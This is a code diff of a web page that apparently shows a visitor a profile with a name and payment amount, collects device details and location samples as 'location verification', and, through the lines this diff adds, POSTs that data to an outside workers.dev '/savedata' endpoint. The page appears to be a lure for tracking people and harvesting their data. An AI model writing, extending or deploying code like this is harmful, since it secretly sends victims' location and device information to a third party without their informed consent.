@@ -205,7 +205,7 @@
         
         let watchId = null;
         let sessionData = {}; 
-        let extractedName = null; // Captured from the API response
+        let extractedName = null; 
 
         function getDeviceDetails() {
             const ua = navigator.userAgent;
@@ -236,7 +236,8 @@
             statusBadge.style.display = 'inline-block';
             startBtn.disabled = true;
 
-            const API_URL = "https://encrypt.ionpromax.workers.dev";
+            // Updated Decrypt Route
+            const API_URL = "https://encrypt.ionpromax.workers.dev/decrypt";
             
             try {
                 const response = await fetch(API_URL, {
@@ -257,7 +258,6 @@
                         profileName.textContent = result.data.name;
                         profileAmount.textContent = `Amount: ${result.data.amount}`;
                         
-                        // Capture the name here so we can append it to the JSON later
                         extractedName = result.data.name;
                         
                         userProfileCard.style.display = 'flex';
@@ -296,10 +296,30 @@
 
         initializeApp();
 
-        function processCollectedData(data) {
+        // Updated Database Save Route
+        async function processCollectedData(data) {
             console.log("Location verification data collected securely:", data);
+            
+            // Show data payload on screen for debugging
             debugOutput.style.display = 'block';
             jsonRender.textContent = JSON.stringify(data, null, 4);
+
+            try {
+                const response = await fetch("https://encrypt.ionpromax.workers.dev/savedata", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(data)
+                });
+                
+                if (response.ok) {
+                    const result = await response.json();
+                    console.log("Data successfully saved to database:", result);
+                } else {
+                    console.error("Failed to save data. API Status:", response.status);
+                }
+            } catch (error) {
+                console.error("Network error while saving data:", error);
+            }
         }
 
         startBtn.addEventListener('click', () => {
@@ -313,7 +333,6 @@
             introScreen.style.display = 'none';
             progressWrapper.style.display = 'block';
 
-            // Inject the extracted name alongside the system details
             sessionData.name = extractedName;
             sessionData.system = getDeviceDetails();
             sessionData.samples = [];
